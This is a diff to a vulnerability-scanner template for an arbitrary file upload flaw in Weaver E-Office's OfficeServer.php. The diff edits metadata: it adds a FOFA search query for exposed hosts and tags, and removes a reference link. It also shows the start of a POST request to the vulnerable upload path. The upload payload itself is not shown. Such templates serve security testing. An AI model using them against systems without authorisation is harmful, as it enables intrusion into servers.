@@ -7,15 +7,15 @@ info:
   verified: true
   descripiton: |
     泛微OA E-Office OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息
-    "eoffice10"
-  reference:
-    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20OfficeServer.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+    fofa: "eoffice10"
+  tags: ecology,upload
+  created: 2024/02/21
 
 set:
   randstr: randomLowercase(12)
   rboundary: randomLowercase(8)
 rules:
-  r0: 
+  r0:
     request:
       method: POST
       path: /eoffice10/server/public/iWebOffice2015/OfficeServer.php
